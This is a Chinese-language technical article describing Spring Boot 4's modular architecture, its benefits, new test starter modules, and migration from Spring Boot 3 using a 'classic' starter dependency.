<p>在即将到来的 <strong>Spring Boot 4</strong> 中，Spring 官方团队对这一现状进行了彻底重构，正式引入 <strong>模块化（Modularization）</strong>  架构。</p>
<p>这一改变不仅影响了项目结构和依赖关系，更为开发者带来了更轻量、更清晰、更高效的使用体验。</p>
<p>Spring Boot 的最大优点之一，是它能自动配置大量技术组件，如 Web、JPA、Redis、Kafka 等。</p>
<p>但随着支持范围的扩大，也带来了几个问题：</p>
<ul>
<li><strong>臃肿的自动配置包</strong>：无论是否使用，所有自动配置类都会被打包进应用；</li>
<li><strong>IDE 提示噪音多</strong>：会出现许多无关的类和配置建议；</li>
<li><strong>启动扫描开销大</strong>：类路径越大，启动速度越慢。</li>
</ul>
<p>Spring 团队意识到：要保持 Spring Boot 的“轻量”和“易用”，就必须重新设计其架构边界，这正是 Spring Boot 4 模块化的出发点。</p>
<p>Spring Boot 4 将原先的单体式自动配置包 <strong>拆分为多个独立模块</strong>。</p>
<p>每个模块仅负责一种特定技术的自动配置，例如：</p>





























<table><thead><tr><th>模块名称</th><th>功能描述</th></tr></thead><tbody><tr><td><code>spring-boot-webmvc</code></td><td>传统 Servlet Web 应用</td></tr><tr><td><code>spring-boot-webflux</code></td><td>响应式 Web 应用</td></tr><tr><td><code>spring-boot-data-jdbc</code></td><td>JDBC 数据访问</td></tr><tr><td><code>spring-boot-flyway</code></td><td>数据库迁移管理</td></tr><tr><td><code>spring-boot-webclient</code></td><td>独立 WebClient 支持</td></tr></tbody></table>
<p>每个模块都有清晰的边界，职责单一、依赖明确，从而让整个框架可维护性更高。</p>
<p>模块化带来的好处有：</p>
<ol>
<li><strong>可维护性更高：</strong> 模块边界清晰，开发者和贡献者可以更专注于特定技术领域，IDE 也能提供更精准的代码提示。</li>
<li><strong>启动更快、内存占用更小：</strong> 应用只引入所需模块，不再加载冗余功能，减少类路径扫描，优化启动时间与内存占用。</li>
<li><strong>配置更精准：</strong> Spring Boot 4 能更准确地识别依赖意图。 例如，只想使用 <code>WebClient</code> 时，引入 <code>spring-boot-webclient</code> 模块即可，无需再关闭 Web 服务器自动配置。</li>
<li><strong>支持更多灵活用例：</strong> 例如，<code>Micrometer</code> 监控模块可以独立使用，无需引入完整的 <code>Actuator</code> 依赖链。</li>
</ol>
<p>模块化不仅体现在主功能上，<strong>测试支持也随之重构</strong>。</p>
<p>Spring Boot 4 新增了测试专用模块，如：</p>
<ul>
<li><code>spring-boot-data-jdbc-test</code></li>
<li><code>spring-boot-starter-webmvc-test</code></li>
<li><code>spring-boot-starter-security-test</code></li>
<li><code>spring-boot-starter-flyway-test</code></li>
</ul>
<p>每个功能模块都有对应的测试 Starter，确保测试依赖和生产依赖保持一致且精简。</p>
<p>如果你想从 Spring Boot 3 迁移到 Spring Boot 4，大多数项目只需要：</p>
<ul>
<li>更新 Starter 依赖</li>
<li>添加测试 Starter</li>
<li>更新包路径与自定义配置</li>
</ul>
<p>模块化后，包路径调整为 <code>org.springframework.boot.&lt;module&gt;</code>。</p>
<p>如果项目中有手动导入的自动配置类或自定义 Starter，需要同步修改。</p>
<p>为方便老项目平滑迁移，Spring Boot 4 提供了  <strong>“Classic Starters”</strong> ：</p>
<pre><code class="hljs language-xml" lang="xml">
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-classic<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>该模式会自动引入所有模块的自动配置，但不包含新的依赖结构，适合过渡阶段。</p>
<p>开发者可先迁移到 Spring Boot 4 的 Classic 模式，再逐步精简为独立模块。</p>
<p>Spring Boot 4 的模块化不仅让框架变得更清晰、更轻量，也让开发体验更自然、更高效。</p>
<p>对于想要构建更轻、更快、更可控的企业级应用而言，Spring Boot 4 的模块化，是一场值得投入的升级。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>